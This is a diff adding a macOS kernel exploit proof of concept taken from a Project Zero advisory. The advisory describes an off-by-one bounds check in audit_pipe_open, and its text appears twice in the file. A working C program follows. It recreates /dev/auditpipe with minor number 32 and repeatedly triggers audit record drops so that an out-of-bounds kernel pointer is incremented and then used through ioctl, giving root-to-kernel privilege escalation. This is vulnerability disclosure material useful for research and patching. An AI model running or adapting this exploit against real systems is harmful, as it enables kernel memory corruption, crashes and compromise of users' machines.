@@ -1,0 +1,212 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1126
+
+MacOS kernel memory corruption due to off-by-one in audit_pipe_open
+
+audit_pipe_open is the special file open handler for the auditpipe device (major number 10.)
+
+Here's the code:
+
+  static int
+  audit_pipe_open(dev_t dev, __unused int flags,  __unused int devtype,
+      __unused proc_t p)
+  {
+    struct audit_pipe *ap;
+    int u;
+
+    u = minor(dev);
+    if (u < 0 || u > MAX_AUDIT_PIPES)
+      return (ENXIO);
+
+    AUDIT_PIPE_LIST_WLOCK();
+    ap = audit_pipe_dtab[u];
+    if (ap == NULL) {
+      ap = audit_pipe_alloc();
+      if (ap == NULL) {
+        AUDIT_PIPE_LIST_WUNLOCK();
+        return (ENOMEM);
+      }
+      audit_pipe_dtab[u] = ap;
+
+
+We can control the minor number via mknod. Here's the definition of audit_pipe_dtab:
+
+  static struct audit_pipe  *audit_pipe_dtab[MAX_AUDIT_PIPES];
+
+There's an off-by-one in the minor number bounds check
+ (u < 0 || u > MAX_AUDIT_PIPES)
+should be
+ (u < 0 || u >= MAX_AUDIT_PIPES)
+
+The other special file operation handlers assume that the minor number of an opened device
+is correct therefore it isn't validated for example in the ioctl handler:
+
+  static int
+  audit_pipe_ioctl(dev_t dev, u_long cmd, caddr_t data,
+      __unused int flag, __unused proc_t p)
+  {
+    ...
+    ap = audit_pipe_dtab[minor(dev)];
+    KASSERT(ap != NULL, ("audit_pipe_ioctl: ap == NULL"));
+    ...
+    switch (cmd) {
+    case FIONBIO:
+      AUDIT_PIPE_LOCK(ap);
+      if (*(int *)data)
+
+Directly after the audit_pipe_dtab array in the bss is this global variable:
+
+  static u_int64_t  audit_pipe_drops;
+
+audit_pipe_drops will be incremented each time an audit message enqueue fails:
+
+  if (ap->ap_qlen >= ap->ap_qlimit) {
+    ap->ap_drops++;
+    audit_pipe_drops++;
+    return;
+  }
+
+So by setting a small ap_qlimit via the AUDITPIPE_SET_QLIMIT ioctl we can increment the
+struct audit_pipe* which is read out-of-bounds.
+
+For this PoC I mknod a /dev/auditpipe with the minor number 32, create a new log file
+and enable auditing. I then set the QLIMIT to 1 and alternately enqueue a new audit record
+and call and ioctl. Each time the enqueue fails it will increment the struct audit_pipe*
+then the ioctl will try to use that pointer.
+
+This is a root to kernel privesc.
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2
+*/
+
+//ianbeer
+#if 0
+MacOS kernel memory corruption due to off-by-one in audit_pipe_open
+
+audit_pipe_open is the special file open handler for the auditpipe device (major number 10.)
+
+Here's the code:
+
+	static int
+	audit_pipe_open(dev_t dev, __unused int flags,  __unused int devtype,
+			__unused proc_t p)
+	{
+		struct audit_pipe *ap;
+		int u;
+
+		u = minor(dev);
+		if (u < 0 || u > MAX_AUDIT_PIPES)
+			return (ENXIO);
+
+		AUDIT_PIPE_LIST_WLOCK();
+		ap = audit_pipe_dtab[u];
+		if (ap == NULL) {
+			ap = audit_pipe_alloc();
+			if (ap == NULL) {
+				AUDIT_PIPE_LIST_WUNLOCK();
+				return (ENOMEM);
+			}
+			audit_pipe_dtab[u] = ap;
+
+
+We can control the minor number via mknod. Here's the definition of audit_pipe_dtab:
+
+	static struct audit_pipe	*audit_pipe_dtab[MAX_AUDIT_PIPES];
+
+There's an off-by-one in the minor number bounds check
+ (u < 0 || u > MAX_AUDIT_PIPES)
+should be
+ (u < 0 || u >= MAX_AUDIT_PIPES)
+
+The other special file operation handlers assume that the minor number of an opened device
+is correct therefore it isn't validated for example in the ioctl handler:
+
+	static int
+	audit_pipe_ioctl(dev_t dev, u_long cmd, caddr_t data,
+			__unused int flag, __unused proc_t p)
+	{
+		...
+		ap = audit_pipe_dtab[minor(dev)];
+		KASSERT(ap != NULL, ("audit_pipe_ioctl: ap == NULL"));
+		...
+		switch (cmd) {
+		case FIONBIO:
+			AUDIT_PIPE_LOCK(ap);
+			if (*(int *)data)
+
+Directly after the audit_pipe_dtab array in the bss is this global variable:
+
+	static u_int64_t	audit_pipe_drops;
+
+audit_pipe_drops will be incremented each time an audit message enqueue fails:
+
+	if (ap->ap_qlen >= ap->ap_qlimit) {
+		ap->ap_drops++;
+		audit_pipe_drops++;
+		return;
+	}
+
+So by setting a small ap_qlimit via the AUDITPIPE_SET_QLIMIT ioctl we can increment the
+struct audit_pipe* which is read out-of-bounds.
+
+For this PoC I mknod a /dev/auditpipe with the minor number 32, create a new log file
+and enable auditing. I then set the QLIMIT to 1 and alternately enqueue a new audit record
+and call and ioctl. Each time the enqueue fails it will increment the struct audit_pipe*
+then the ioctl will try to use that pointer.
+
+This is a root to kernel privesc.
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2
+#endif
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <net/bpf.h>
+#include <net/if.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <bsm/audit.h>
+#include <security/audit/audit_ioctl.h>
+
+int main(int argc, char** argv) {
+  system("rm -rf /dev/auditpipe");
+  system("mknod /dev/auditpipe c 10 32");
+
+  int fd = open("/dev/auditpipe", O_RDWR);
+
+  if (fd == -1) {
+    perror("failed to open auditpipe device\n");
+    exit(EXIT_FAILURE);
+  }
+  printf("opened device\n");
+
+  system("touch a_log_file");
+  int auditerr = auditctl("a_log_file");
+  if (auditerr == -1) {
+    perror("failed to set a new log file\n");
+  }
+
+  uint32_t qlim = 1;
+  int err = ioctl(fd, AUDITPIPE_SET_QLIMIT, &qlim);
+  if (err == -1) {
+    perror("AUDITPIPE_SET_QLIMIT");
+    exit(EXIT_FAILURE);
+  }
+
+  while(1) {
+    char* audit_data = "\x74hello";
+    int audit_len = strlen(audit_data)+1;
+    audit(audit_data, audit_len);
+    uint32_t nread = 0;
+    int err = ioctl(fd, FIONREAD, &qlim);
+    if (err == -1) {
+      perror("FIONREAD");
+      exit(EXIT_FAILURE);
+    }
+  }
+
+  return 0;
+}
